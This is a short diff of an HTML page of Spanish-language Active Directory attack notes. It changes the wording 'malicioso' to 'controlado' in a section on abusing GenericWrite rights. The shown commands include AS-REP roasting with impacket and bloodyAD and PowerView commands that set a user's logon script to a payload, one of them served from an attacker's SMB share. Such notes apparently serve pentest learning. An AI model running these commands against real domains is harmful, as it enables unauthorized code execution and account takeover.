@@ -79,10 +79,10 @@ impacket-GetNPUsers &lt;dominio&gt;/lidia -no-pass 2&gt;/dev/null</code></pre>
             </section>
             <p><span class="notebook-review-note">Aviso: <code>GenericWrite</code> sobre <code>Usuario</code> &quot;lidia&quot; <code>Logon Script</code></span></p>
             <section class="code-card">
-              <h3>Asignar a lidia un script malicioso que se ejecutará cuando inicie sesión</h3>
+              <h3>Asignar a lidia un script controlado que se ejecutará cuando inicie sesión</h3>
               <pre><code># Kali: Levantar SMB server con el payload.bat
 bloodyAD --host &lt;dc_ip&gt; -d &lt;dominio&gt; -u &#x27;alvaro&#x27; -p &#x27;alvaro123&#x27; set object &#x27;lidia&#x27; scriptpath -v &#x27;\\&lt;kali_ip&gt;\payload.bat&#x27;
-# Windows: Asignar a lidia un payload.ps1 malicioso para cuando inicie sesión
+# Windows: Asignar a lidia un payload.ps1 controlado para cuando inicie sesión
 Set-DomainObject -Identity &#x27;lidia&#x27; -SET @{scriptpath=&#x27;C:\Temp\payload.ps1&#x27;}</code></pre>
             </section>
             <p><span class="notebook-review-note">Aviso: <code>GenericWrite</code> sobre <code>Equipos</code></span></p>
